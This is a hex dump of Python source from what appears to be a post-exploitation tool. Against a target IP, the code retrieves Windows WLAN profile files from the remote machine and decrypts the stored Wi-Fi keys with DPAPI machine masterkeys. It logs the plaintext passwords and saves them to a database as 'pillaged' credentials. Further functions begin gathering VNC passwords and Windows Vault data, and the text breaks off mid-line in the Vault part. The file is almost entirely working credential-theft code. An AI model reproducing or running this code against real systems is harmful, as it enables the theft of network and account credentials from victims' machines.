-00008f20: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e69  ..self.logging.i
-00008f30: 6e66 6f28 6622 5b7b 7365 6c66 2e6f 7074  nfo(f"[{self.opt
-00008f40: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-00008f50: 207b 6263 6f6c 6f72 732e 4f4b 424c 5545   {bcolors.OKBLUE
-00008f60: 7d5b 2b5d 2047 6174 6865 7269 6e67 2057  }[+] Gathering W
-00008f70: 6966 6920 4b65 7973 7b62 636f 6c6f 7273  ifi Keys{bcolors
-00008f80: 2e45 4e44 437d 2229 0a09 0962 6c61 636b  .ENDC}")...black
-00008f90: 6c69 7374 203d 205b 272e 272c 2027 2e2e  list = ['.', '..
-00008fa0: 275d 0a09 096d 6163 6869 6e65 5f64 6972  ']...machine_dir
-00008fb0: 6563 746f 7269 6573 203d 205b 2822 5072  ectories = [("Pr
-00008fc0: 6f67 7261 6d44 6174 615c 5c4d 6963 726f  ogramData\\Micro
-00008fd0: 736f 6674 5c5c 576c 616e 7376 635c 5c50  soft\\Wlansvc\\P
-00008fe0: 726f 6669 6c65 735c 5c49 6e74 6572 6661  rofiles\\Interfa
-00008ff0: 6365 7322 2c20 272a 2e78 6d6c 2729 5d0a  ces", '*.xml')].
-00009000: 0a09 0966 6f72 2069 6e66 6f20 696e 206d  ...for info in m
-00009010: 6163 6869 6e65 5f64 6972 6563 746f 7269  achine_directori
-00009020: 6573 3a0a 0909 0975 7365 7220 3d20 7365  es:....user = se
-00009030: 6c66 2e47 6574 5573 6572 4279 4e61 6d65  lf.GetUserByName
-00009040: 2827 4d41 4348 494e 4524 2729 0a09 0909  ('MACHINE$')....
-00009050: 6d79 5f64 6972 2c20 6d79 5f6d 6173 6b20  my_dir, my_mask 
-00009060: 3d20 696e 666f 0a09 0909 2320 696e 7465  = info....# inte
-00009070: 7266 6163 6520 6e61 6d65 0a09 0909 7365  rface name....se
-00009080: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-00009090: 2866 225b 7b73 656c 662e 6f70 7469 6f6e  (f"[{self.option
-000090a0: 732e 7461 7267 6574 5f69 707d 5d20 5b2b  s.target_ip}] [+
-000090b0: 5d20 4c6f 6f6b 696e 6720 666f 7220 696e  ] Looking for in
-000090c0: 7465 7266 6163 6573 2069 6e20 7b6d 795f  terfaces in {my_
-000090d0: 6469 727d 2229 2020 2320 4e6f 206d 6173  dir}")  # No mas
-000090e0: 6b0a 0909 096d 795f 6469 7265 6374 6f72  k....my_director
-000090f0: 7920 3d20 7365 6c66 2e6d 7966 696c 656f  y = self.myfileo
-00009100: 7073 2e64 6f5f 6c73 286d 795f 6469 722c  ps.do_ls(my_dir,
-00009110: 2027 2a27 2c20 6469 7370 6c61 793d 4661   '*', display=Fa
-00009120: 6c73 6529 0a09 0909 666f 7220 696e 666f  lse)....for info
-00009130: 7320 696e 206d 795f 6469 7265 6374 6f72  s in my_director
-00009140: 793a 0a09 0909 096c 6f6e 676e 616d 652c  y:.....longname,
-00009150: 2069 735f 6469 7265 6374 6f72 7920 3d20   is_directory = 
-00009160: 696e 666f 730a 0909 0909 6966 206c 6f6e  infos.....if lon
-00009170: 676e 616d 6520 6e6f 7420 696e 2062 6c61  gname not in bla
-00009180: 636b 6c69 7374 2061 6e64 2069 735f 6469  cklist and is_di
-00009190: 7265 6374 6f72 793a 0a09 0909 0909 7365  rectory:......se
-000091a0: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-000091b0: 2866 225b 7b73 656c 662e 6f70 7469 6f6e  (f"[{self.option
-000091c0: 732e 7461 7267 6574 5f69 707d 5d20 5b2b  s.target_ip}] [+
-000091d0: 5d20 476f 7420 5769 6669 2069 6e74 6572  ] Got Wifi inter
-000091e0: 6661 6365 207b 6c6f 6e67 6e61 6d65 7d22  face {longname}"
-000091f0: 290a 0909 0909 0974 6d70 5f70 7764 203d  )......tmp_pwd =
-00009200: 206e 7470 6174 682e 6a6f 696e 286d 795f   ntpath.join(my_
-00009210: 6469 722c 206c 6f6e 676e 616d 6529 0a09  dir, longname)..
-00009220: 0909 0909 6d79 5f64 6972 6563 746f 7279  ....my_directory
-00009230: 3220 3d20 7365 6c66 2e6d 7966 696c 656f  2 = self.myfileo
-00009240: 7073 2e64 6f5f 6c73 2874 6d70 5f70 7764  ps.do_ls(tmp_pwd
-00009250: 2c20 6d79 5f6d 6173 6b2c 2064 6973 706c  , my_mask, displ
-00009260: 6179 3d46 616c 7365 290a 0909 0909 0966  ay=False)......f
-00009270: 6f72 2069 6e66 6f73 3220 696e 206d 795f  or infos2 in my_
-00009280: 6469 7265 6374 6f72 7932 3a0a 0909 0909  directory2:.....
-00009290: 0909 6c6f 6e67 6e61 6d65 322c 2069 735f  ..longname2, is_
-000092a0: 6469 7265 6374 6f72 7932 203d 2069 6e66  directory2 = inf
-000092b0: 6f73 320a 0909 0909 0909 6966 206c 6f6e  os2.......if lon
-000092c0: 676e 616d 6532 206e 6f74 2069 6e20 626c  gname2 not in bl
-000092d0: 6163 6b6c 6973 7420 616e 6420 6e6f 7420  acklist and not 
-000092e0: 6973 5f64 6972 6563 746f 7279 323a 0a09  is_directory2:..
-000092f0: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
-00009300: 6e67 2e64 6562 7567 2866 225b 7b73 656c  ng.debug(f"[{sel
-00009310: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
-00009320: 5f69 707d 5d20 5b2b 5d20 476f 7420 7769  _ip}] [+] Got wi
-00009330: 6669 2063 6f6e 6669 6720 6669 6c65 207b  fi config file {
-00009340: 6c6f 6e67 6e61 6d65 327d 2229 0a09 0909  longname2}")....
-00009350: 0909 0909 2320 446f 776e 6c6f 6164 696e  ....# Downloadin
-00009360: 6720 426c 6f62 2066 696c 650a 0909 0909  g Blob file.....
-00009370: 0909 096c 6f63 616c 6669 6c65 203d 2073  ...localfile = s
-00009380: 656c 662e 6d79 6669 6c65 6f70 732e 6765  elf.myfileops.ge
-00009390: 745f 6669 6c65 286e 7470 6174 682e 6a6f  t_file(ntpath.jo
-000093a0: 696e 2874 6d70 5f70 7764 2c20 6c6f 6e67  in(tmp_pwd, long
-000093b0: 6e61 6d65 3229 290a 0909 0909 0909 0975  name2))........u
-000093c0: 7365 722e 6669 6c65 735b 6c6f 6e67 6e61  ser.files[longna
-000093d0: 6d65 325d 203d 207b 7d0a 0909 0909 0909  me2] = {}.......
-000093e0: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
-000093f0: 6e61 6d65 325d 5b27 7479 7065 275d 203d  name2]['type'] =
-00009400: 2027 7769 6669 270a 0909 0909 0909 0975   'wifi'........u
-00009410: 7365 722e 6669 6c65 735b 6c6f 6e67 6e61  ser.files[longna
-00009420: 6d65 325d 5b27 7374 6174 7573 275d 203d  me2]['status'] =
-00009430: 2027 656e 6372 7970 7465 6427 0a09 0909   'encrypted'....
-00009440: 0909 0909 7573 6572 2e66 696c 6573 5b6c  ....user.files[l
-00009450: 6f6e 676e 616d 6532 5d5b 2770 6174 6827  ongname2]['path'
-00009460: 5d20 3d20 6c6f 6361 6c66 696c 650a 0a09  ] = localfile...
-00009470: 0909 0909 0909 7769 7468 206f 7065 6e28  ......with open(
-00009480: 6c6f 6361 6c66 696c 652c 2027 7262 2729  localfile, 'rb')
-00009490: 2061 7320 663a 0a09 0909 0909 0909 0974   as f:.........t
-000094a0: 7279 3a0a 0909 0909 0909 0909 0966 696c  ry:..........fil
-000094b0: 655f 6461 7461 203d 2066 2e72 6561 6428  e_data = f.read(
-000094c0: 292e 7265 706c 6163 6528 6227 5c78 3061  ).replace(b'\x0a
-000094d0: 272c 2062 2727 292e 7265 706c 6163 6528  ', b'').replace(
-000094e0: 6227 5c78 3064 272c 2062 2727 290a 0909  b'\x0d', b'')...
-000094f0: 0909 0909 0909 0977 6966 695f 6e61 6d65  .......wifi_name
-00009500: 203d 2072 652e 7365 6172 6368 2862 273c   = re.search(b'<
-00009510: 6e61 6d65 3e28 5b5e 3c5d 2b29 3c2f 6e61  name>([^<]+)</na
-00009520: 6d65 3e27 2c20 6669 6c65 5f64 6174 6129  me>', file_data)
-00009530: 0a09 0909 0909 0909 0909 7769 6669 5f6e  ..........wifi_n
-00009540: 616d 6520 3d20 7769 6669 5f6e 616d 652e  ame = wifi_name.
-00009550: 6772 6f75 7028 3129 0a09 0909 0909 0909  group(1)........
-00009560: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
-00009570: 676e 616d 6532 5d5b 2777 6966 695f 6e61  gname2]['wifi_na
-00009580: 6d65 275d 203d 2077 6966 695f 6e61 6d65  me'] = wifi_name
-00009590: 0a09 0909 0909 0909 0909 6b65 795f 6d61  ..........key_ma
-000095a0: 7465 7269 616c 5f72 6520 3d20 7265 2e73  terial_re = re.s
-000095b0: 6561 7263 6828 6227 3c6b 6579 4d61 7465  earch(b'<keyMate
-000095c0: 7269 616c 3e28 5b30 2d39 412d 465d 2b29  rial>([0-9A-F]+)
-000095d0: 3c2f 6b65 794d 6174 6572 6961 6c3e 272c  </keyMaterial>',
-000095e0: 2066 696c 655f 6461 7461 290a 0909 0909   file_data).....
-000095f0: 0909 0909 0969 6620 6e6f 7420 6b65 795f  .....if not key_
-00009600: 6d61 7465 7269 616c 5f72 653a 0a09 0909  material_re:....
-00009610: 0909 0909 0909 0963 6f6e 7469 6e75 650a  .......continue.
-00009620: 0909 0909 0909 0909 096b 6579 5f6d 6174  .........key_mat
-00009630: 6572 6961 6c20 3d20 6b65 795f 6d61 7465  erial = key_mate
-00009640: 7269 616c 5f72 652e 6772 6f75 7028 3129  rial_re.group(1)
-00009650: 0a09 0909 0909 0909 0923 2077 6974 6820  .........# with 
-00009660: 6f70 656e 2822 6b65 795f 6d61 7465 7269  open("key_materi
-00009670: 616c 2e74 6d70 222c 2022 7762 2229 2061  al.tmp", "wb") a
-00009680: 7320 663a 0a09 0909 0909 0909 0923 0966  s f:.........#.f
-00009690: 2e77 7269 7465 2862 696e 6173 6369 692e  .write(binascii.
-000096a0: 756e 6865 786c 6966 7928 6b65 795f 6d61  unhexlify(key_ma
-000096b0: 7465 7269 616c 2929 0a09 0909 0909 0909  terial))........
-000096c0: 0965 7863 6570 7420 4578 6365 7074 696f  .except Exceptio
-000096d0: 6e20 6173 2065 783a 0a09 0909 0909 0909  n as ex:........
-000096e0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e65  ..self.logging.e
-000096f0: 7272 6f72 2866 227b 6263 6f6c 6f72 732e  rror(f"{bcolors.
-00009700: 5741 524e 494e 477d 4572 726f 7220 696e  WARNING}Error in
-00009710: 2077 6966 6920 7061 7273 696e 677b 6263   wifi parsing{bc
-00009720: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
-00009730: 0909 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
-00009740: 696e 672e 6465 6275 6728 6578 290a 0a09  ing.debug(ex)...
-00009750: 0909 0909 0909 0974 7279 3a0a 0909 0909  .......try:.....
-00009760: 0909 0909 096d 796f 7074 696f 6e73 203d  .....myoptions =
-00009770: 2063 6f70 792e 6465 6570 636f 7079 2873   copy.deepcopy(s
-00009780: 656c 662e 6f70 7469 6f6e 7329 0a09 0909  elf.options)....
-00009790: 0909 0909 0909 6d79 6f70 7469 6f6e 732e  ......myoptions.
-000097a0: 6669 6c65 203d 204e 6f6e 6520 2023 2022  file = None  # "
-000097b0: 6b65 795f 6d61 7465 7269 616c 2e74 6d70  key_material.tmp
-000097c0: 2220 2023 2042 4c4f 4220 746f 2070 6172  "  # BLOB to par
-000097d0: 7365 0a09 0909 0909 0909 0909 6d79 6f70  se..........myop
-000097e0: 7469 6f6e 732e 6b65 7920 3d20 4e6f 6e65  tions.key = None
-000097f0: 0a09 0909 0909 0909 0909 6d79 6f70 7469  ..........myopti
-00009800: 6f6e 732e 6d61 7374 6572 6b65 7973 203d  ons.masterkeys =
-00009810: 204e 6f6e 6520 2023 2075 7365 722e 6d61   None  # user.ma
-00009820: 7374 6572 6b65 7973 5f66 696c 650a 0909  sterkeys_file...
-00009830: 0909 0909 0909 096d 7964 7061 7069 203d  .......mydpapi =
-00009840: 2044 5041 5049 286d 796f 7074 696f 6e73   DPAPI(myoptions
-00009850: 2c20 7365 6c66 2e6c 6f67 6769 6e67 290a  , self.logging).
-00009860: 0909 0909 0909 0909 0967 7569 6420 3d20  .........guid = 
-00009870: 6d79 6470 6170 692e 6669 6e64 5f42 6c6f  mydpapi.find_Blo
-00009880: 625f 6d61 7374 6572 6b65 7928 7261 775f  b_masterkey(raw_
-00009890: 6461 7461 3d62 696e 6173 6369 692e 756e  data=binascii.un
-000098a0: 6865 786c 6966 7928 6b65 795f 6d61 7465  hexlify(key_mate
-000098b0: 7269 616c 2929 0a09 0909 0909 0909 0909  rial))..........
-000098c0: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-000098d0: 7567 280a 0909 0909 0909 0909 0909 6622  ug(...........f"
-000098e0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-000098f0: 6172 6765 745f 6970 7d5d 204c 6f6f 6b69  arget_ip}] Looki
-00009900: 6e67 2066 6f72 207b 6c6f 6e67 6e61 6d65  ng for {longname
-00009910: 327d 206d 6173 7465 726b 6579 203a 207b  2} masterkey : {
-00009920: 6775 6964 7d22 290a 0909 0909 0909 0909  guid}").........
-00009930: 0969 6620 6775 6964 2021 3d20 4e6f 6e65  .if guid != None
-00009940: 3a0a 0909 0909 0909 0909 0909 6d61 7374  :...........mast
-00009950: 6572 6b65 7920 3d20 7365 6c66 2e67 6574  erkey = self.get
-00009960: 5f6d 6173 7465 726b 6579 2875 7365 723d  _masterkey(user=
-00009970: 7573 6572 2c20 6775 6964 3d67 7569 642c  user, guid=guid,
-00009980: 2074 7970 653d 274d 4143 4849 4e45 2729   type='MACHINE')
-00009990: 0a09 0909 0909 0909 0909 0969 6620 6d61  ...........if ma
-000099a0: 7374 6572 6b65 7920 213d 204e 6f6e 653a  sterkey != None:
-000099b0: 0a09 0909 0909 0909 0909 0909 6966 206d  ............if m
-000099c0: 6173 7465 726b 6579 5b27 7374 6174 7573  asterkey['status
-000099d0: 275d 203d 3d20 2764 6563 7279 7074 6564  '] == 'decrypted
-000099e0: 273a 0a09 0909 0909 0909 0909 0909 096d  ':.............m
-000099f0: 7964 7061 7069 2e6f 7074 696f 6e73 2e6b  ydpapi.options.k
-00009a00: 6579 203d 206d 6173 7465 726b 6579 5b27  ey = masterkey['
-00009a10: 6b65 7927 5d0a 0909 0909 0909 0909 0909  key']...........
-00009a20: 0909 2320 6372 6564 5f64 6174 6120 3d20  ..# cred_data = 
-00009a30: 6d79 6470 6170 692e 6465 6372 7970 745f  mydpapi.decrypt_
-00009a40: 6372 6564 656e 7469 616c 2829 0a09 0909  credential()....
-00009a50: 0909 0909 0909 0909 0963 7265 645f 6461  .........cred_da
-00009a60: 7461 203d 206d 7964 7061 7069 2e64 6563  ta = mydpapi.dec
-00009a70: 7279 7074 5f62 6c6f 6228 0a09 0909 0909  rypt_blob(......
-00009a80: 0909 0909 0909 0909 7261 775f 6461 7461  ........raw_data
-00009a90: 3d62 696e 6173 6369 692e 756e 6865 786c  =binascii.unhexl
-00009aa0: 6966 7928 6b65 795f 6d61 7465 7269 616c  ify(key_material
-00009ab0: 2929 0a09 0909 0909 0909 0909 0909 0969  )).............i
-00009ac0: 6620 6372 6564 5f64 6174 6120 213d 204e  f cred_data != N
-00009ad0: 6f6e 653a 0a09 0909 0909 0909 0909 0909  one:............
-00009ae0: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
-00009af0: 676e 616d 6532 5d5b 2773 7461 7475 7327  gname2]['status'
-00009b00: 5d20 3d20 2764 6563 7279 7074 6564 270a  ] = 'decrypted'.
-00009b10: 0909 0909 0909 0909 0909 0909 0975 7365  .............use
-00009b20: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
-00009b30: 325d 5b27 6461 7461 275d 203d 2063 7265  2]['data'] = cre
-00009b40: 645f 6461 7461 0a09 0909 0909 0909 0909  d_data..........
-00009b50: 0909 0909 7573 6572 2e66 696c 6573 5b6c  ....user.files[l
-00009b60: 6f6e 676e 616d 6532 5d5b 2773 6563 7265  ongname2]['secre
-00009b70: 7427 5d20 3d20 6372 6564 5f64 6174 610a  t'] = cred_data.
-00009b80: 0909 0909 0909 0909 0909 0909 0973 656c  .............sel
-00009b90: 662e 6c6f 6767 696e 672e 696e 666f 280a  f.logging.info(.
-00009ba0: 0909 0909 0909 0909 0909 0909 0909 6622  ..............f"
-00009bb0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-00009bc0: 6172 6765 745f 6970 7d5d 205b 2b5d 207b  arget_ip}] [+] {
-00009bd0: 6263 6f6c 6f72 732e 4f4b 4752 4545 4e7d  bcolors.OKGREEN}
-00009be0: 2057 6966 6920 7b62 636f 6c6f 7273 2e4f   Wifi {bcolors.O
-00009bf0: 4b42 4c55 457d 7b77 6966 695f 6e61 6d65  KBLUE}{wifi_name
-00009c00: 7d20 7b62 636f 6c6f 7273 2e4f 4b47 5245  } {bcolors.OKGRE
-00009c10: 454e 7d20 2d20 7b63 7265 645f 6461 7461  EN} - {cred_data
-00009c20: 7d7b 6263 6f6c 6f72 732e 454e 4443 7d22  }{bcolors.ENDC}"
-00009c30: 290a 0909 0909 0909 0909 0909 0909 0923  )..............#
-00009c40: 2323 2323 2323 2323 2323 2350 524f 4345  ###########PROCE
-00009c50: 5353 494e 4720 4441 5441 0a09 0909 0909  SSING DATA......
-00009c60: 0909 0909 0909 0909 7365 6c66 2e64 622e  ........self.db.
-00009c70: 6164 645f 6372 6564 7a28 6372 6564 7a5f  add_credz(credz_
-00009c80: 7479 7065 3d27 7769 6669 272c 0a09 0909  type='wifi',....
-00009c90: 0909 0909 0909 0909 0909 0909 0909 2020  ..............  
-00009ca0: 6372 6564 7a5f 7573 6572 6e61 6d65 3d77  credz_username=w
-00009cb0: 6966 695f 6e61 6d65 2e64 6563 6f64 6528  ifi_name.decode(
-00009cc0: 2775 7466 2d38 2729 2c0a 0909 0909 0909  'utf-8'),.......
-00009cd0: 0909 0909 0909 0909 0909 0920 2063 7265  ...........  cre
-00009ce0: 647a 5f70 6173 7377 6f72 643d 6372 6564  dz_password=cred
-00009cf0: 5f64 6174 612e 6465 636f 6465 2827 7574  _data.decode('ut
-00009d00: 662d 3827 292c 0a09 0909 0909 0909 0909  f-8'),..........
-00009d10: 0909 0909 0909 0909 2020 6372 6564 7a5f  ........  credz_
-00009d20: 7461 7267 6574 3d77 6966 695f 6e61 6d65  target=wifi_name
-00009d30: 2e64 6563 6f64 6528 2775 7466 2d38 2729  .decode('utf-8')
-00009d40: 2c0a 0909 0909 0909 0909 0909 0909 0909  ,...............
-00009d50: 0909 0920 2063 7265 647a 5f70 6174 683d  ...  credz_path=
-00009d60: 7573 6572 2e66 696c 6573 5b6c 6f6e 676e  user.files[longn
-00009d70: 616d 6532 5d5b 2770 6174 6827 5d2c 0a09  ame2]['path'],..
-00009d80: 0909 0909 0909 0909 0909 0909 0909 0909  ................
-00009d90: 2020 7069 6c6c 6167 6564 5f66 726f 6d5f    pillaged_from_
-00009da0: 636f 6d70 7574 6572 5f69 703d 7365 6c66  computer_ip=self
-00009db0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-00009dc0: 6970 2c0a 0909 0909 0909 0909 0909 0909  ip,.............
-00009dd0: 0909 0909 0920 2070 696c 6c61 6765 645f  .....  pillaged_
-00009de0: 6672 6f6d 5f75 7365 726e 616d 653d 7573  from_username=us
-00009df0: 6572 2e75 7365 726e 616d 6529 0a09 0909  er.username)....
-00009e00: 0909 0909 0909 0909 2320 7365 6d66 2e70  ........# semf.p
-00009e10: 726f 6365 7373 5f64 6563 7279 7074 6564  rocess_decrypted
-00009e20: 5f64 6174 6128 7573 6572 2e66 696c 6573  _data(user.files
-00009e30: 5b6c 6f6e 676e 616d 6532 5d29 2363 7265  [longname2])#cre
-00009e40: 645f 6461 7461 2c20 7573 6572 2c20 6c6f  d_data, user, lo
-00009e50: 6361 6c66 696c 652c 2074 7970 653d 2777  calfile, type='w
-00009e60: 6966 6927 2c20 6172 6773 3d5b 7769 6669  ifi', args=[wifi
-00009e70: 5f6e 616d 655d 290a 0909 0909 0909 0909  _name]).........
-00009e80: 0909 0965 6c73 653a 0a09 0909 0909 0909  ...else:........
-00009e90: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
-00009ea0: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
-00009eb0: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
-00009ec0: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
-00009ed0: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
-00009ee0: 494e 477d 4572 726f 7220 6465 6372 7970  ING}Error decryp
-00009ef0: 7469 6e67 2057 4946 4920 426c 6f62 2066  ting WIFI Blob f
-00009f00: 6f72 207b 6c6f 6361 6c66 696c 657d 2077  or {localfile} w
-00009f10: 6974 6820 4d61 7374 6572 6b65 7920 2d20  ith Masterkey - 
-00009f20: 4d61 7374 6572 6b65 7920 6e6f 7420 6465  Masterkey not de
-00009f30: 6372 7970 7465 647b 6263 6f6c 6f72 732e  crypted{bcolors.
-00009f40: 454e 4443 7d22 290a 0909 0909 0909 0909  ENDC}").........
-00009f50: 0909 656c 7365 3a0a 0909 0909 0909 0909  ..else:.........
-00009f60: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-00009f70: 6465 6275 6728 0a09 0909 0909 0909 0909  debug(..........
-00009f80: 0909 0966 225b 7b73 656c 662e 6f70 7469  ...f"[{self.opti
-00009f90: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
-00009fa0: 7b62 636f 6c6f 7273 2e57 4152 4e49 4e47  {bcolors.WARNING
-00009fb0: 7d45 7272 6f72 2064 6563 7279 7074 696e  }Error decryptin
-00009fc0: 6720 5749 4649 2042 6c6f 6220 666f 7220  g WIFI Blob for 
-00009fd0: 7b6c 6f63 616c 6669 6c65 7d20 7769 7468  {localfile} with
-00009fe0: 204d 6173 7465 726b 6579 2d20 6361 6e74   Masterkey- cant
-00009ff0: 2067 6574 206d 6173 7465 726b 6579 207b   get masterkey {
-0000a000: 6775 6964 7d7b 6263 6f6c 6f72 732e 454e  guid}{bcolors.EN
-0000a010: 4443 7d22 290a 0909 0909 0909 0909 0965  DC}")..........e
-0000a020: 6c73 653a 0a09 0909 0909 0909 0909 0973  lse:...........s
-0000a030: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-0000a040: 6728 0a09 0909 0909 0909 0909 0909 6622  g(............f"
-0000a050: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-0000a060: 6172 6765 745f 6970 7d5d 207b 6263 6f6c  arget_ip}] {bcol
-0000a070: 6f72 732e 5741 524e 494e 477d 4572 726f  ors.WARNING}Erro
-0000a080: 7220 6465 6372 7970 7469 6e67 2057 4946  r decrypting WIF
-0000a090: 4942 6c6f 6220 666f 7220 7b6c 6f63 616c  IBlob for {local
-0000a0a0: 6669 6c65 7d20 7769 7468 204d 6173 7465  file} with Maste
-0000a0b0: 726b 6579 202d 2063 616e 2074 2067 6574  rkey - can t get
-0000a0c0: 2074 6865 2047 5549 4420 6f66 206d 6173   the GUID of mas
-0000a0d0: 7465 726b 6579 2066 726f 6d20 626c 6f62  terkey from blob
-0000a0e0: 2066 696c 657b 6263 6f6c 6f72 732e 454e   file{bcolors.EN
-0000a0f0: 4443 7d22 290a 0909 0909 0909 0909 6578  DC}").........ex
-0000a100: 6365 7074 2045 7863 6570 7469 6f6e 2061  cept Exception a
-0000a110: 7320 6578 3a0a 0909 0909 0909 0909 0973  s ex:..........s
-0000a120: 656c 662e 6c6f 6767 696e 672e 6572 726f  elf.logging.erro
-0000a130: 7228 0a09 0909 0909 0909 0909 0966 227b  r(...........f"{
-0000a140: 6263 6f6c 6f72 732e 5741 524e 494e 477d  bcolors.WARNING}
-0000a150: 4578 6365 7074 696f 6e20 6465 6372 7970  Exception decryp
-0000a160: 7469 6e67 2077 6966 6920 6372 6564 656e  ting wifi creden
-0000a170: 7469 616c 737b 6263 6f6c 6f72 732e 454e  tials{bcolors.EN
-0000a180: 4443 7d22 290a 0909 0909 0909 0909 0973  DC}")..........s
-0000a190: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-0000a1a0: 6728 6578 290a 0909 7265 7475 726e 2031  g(ex)...return 1
-0000a1b0: 0a0a 0964 6566 2047 6574 564e 4328 7365  ...def GetVNC(se
-0000a1c0: 6c66 293a 0a09 0974 7279 3a0a 0909 0973  lf):...try:....s
-0000a1d0: 656c 662e 6c6f 6767 696e 672e 696e 666f  elf.logging.info
-0000a1e0: 2866 225b 7b73 656c 662e 6f70 7469 6f6e  (f"[{self.option
-0000a1f0: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
-0000a200: 636f 6c6f 7273 2e4f 4b42 4c55 457d 5b2b  colors.OKBLUE}[+
-0000a210: 5d20 4761 7468 6572 696e 6720 564e 4320  ] Gathering VNC 
-0000a220: 5061 7373 776f 7264 737b 6263 6f6c 6f72  Passwords{bcolor
-0000a230: 732e 454e 4443 7d22 290a 0909 096d 7976  s.ENDC}")....myv
-0000a240: 6e63 203d 2056 6e63 2873 656c 662e 6d79  nc = Vnc(self.my
-0000a250: 7265 676f 7073 2c20 7365 6c66 2e6d 7966  regops, self.myf
-0000a260: 696c 656f 7073 2c20 7365 6c66 2e6c 6f67  ileops, self.log
-0000a270: 6769 6e67 2c20 7365 6c66 2e6f 7074 696f  ging, self.optio
-0000a280: 6e73 2c20 7365 6c66 2e64 6229 0a09 0909  ns, self.db)....
-0000a290: 6d79 766e 632e 766e 635f 6672 6f6d 5f66  myvnc.vnc_from_f
-0000a2a0: 696c 6573 7973 7465 6d28 290a 0909 096d  ilesystem()....m
-0000a2b0: 7976 6e63 2e76 6e63 5f66 726f 6d5f 7265  yvnc.vnc_from_re
-0000a2c0: 6769 7374 7279 2829 0a09 0965 7863 6570  gistry()...excep
-0000a2d0: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
-0000a2e0: 783a 0a09 0909 7365 6c66 2e6c 6f67 6769  x:....self.loggi
-0000a2f0: 6e67 2e65 7272 6f72 2866 227b 6263 6f6c  ng.error(f"{bcol
-0000a300: 6f72 732e 5741 524e 494e 477d 4578 6365  ors.WARNING}Exce
-0000a310: 7074 696f 6e20 494e 2056 4e43 2047 4154  ption IN VNC GAT
-0000a320: 4845 5249 4e47 7b62 636f 6c6f 7273 2e45  HERING{bcolors.E
-0000a330: 4e44 437d 2229 0a09 0909 7365 6c66 2e6c  NDC}")....self.l
-0000a340: 6f67 6769 6e67 2e64 6562 7567 2865 7829  ogging.debug(ex)
-0000a350: 0a0a 0964 6566 2047 6574 5661 756c 7473  ...def GetVaults
-0000a360: 2873 656c 6629 3a0a 0909 7365 6c66 2e6c  (self):...self.l
-0000a370: 6f67 6769 6e67 2e69 6e66 6f28 6622 5b7b  ogging.info(f"[{
-0000a380: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
-0000a390: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
-0000a3a0: 732e 4f4b 424c 5545 7d5b 2b5d 2047 6174  s.OKBLUE}[+] Gat
-0000a3b0: 6865 7269 6e67 2056 6175 6c74 737b 6263  hering Vaults{bc
-0000a3c0: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
-0000a3d0: 626c 6163 6b6c 6973 7420 3d20 5b27 2e27  blacklist = ['.'
-0000a3e0: 2c20 272e 2e27 2c20 2755 7365 7250 726f  , '..', 'UserPro
-0000a3f0: 6669 6c65 526f 616d 696e 6727 5d0a 0909  fileRoaming']...
-0000a400: 2320 6372 6564 656e 7469 616c 7320 3f0a  # credentials ?.
-0000a410: 0909 2320 5661 756c 7473 203f 0a09 0923  ..# Vaults ?...#
-0000a420: 2050 6172 7365 2063 6872 6f6d 650a 0909   Parse chrome...
-0000a430: 2320 6175 7472 6573 206e 6176 6967 6174  # autres navigat
-0000a440: 6575 7273 203f 0a09 0923 2043 7265 6448  eurs ?...# CredH
-0000a450: 6973 746f 7279 0a0a 0909 7573 6572 5f64  istory....user_d
-0000a460: 6972 6563 746f 7269 6573 203d 205b 2822  irectories = [("
-0000a470: 5573 6572 735c 5c7b 7573 6572 6e61 6d65  Users\\{username
-0000a480: 7d5c 5c41 7070 4461 7461 5c5c 4c6f 6361  }\\AppData\\Loca
-0000a490: 6c5c 5c4d 6963 726f 736f 6674 5c5c 5661  l\\Microsoft\\Va
-0000a4a0: 756c 7422 2c20 272a 272c 2027 7661 756c  ult", '*', 'vaul
-0000a4b0: 7427 2c20 2744 4f4d 4149 4e27 295d 0a09  t', 'DOMAIN')]..
-0000a4c0: 096d 6163 6869 6e65 5f64 6972 6563 746f  .machine_directo
-0000a4d0: 7269 6573 203d 205b 2822 5072 6f67 7261  ries = [("Progra
-0000a4e0: 6d44 6174 615c 5c4d 6963 726f 736f 6674  mData\\Microsoft
-0000a4f0: 5c5c 5661 756c 7422 2c20 272a 272c 2027  \\Vault", '*', '
-0000a500: 7661 756c 7427 2c20 274d 4143 4849 4e45  vault', 'MACHINE
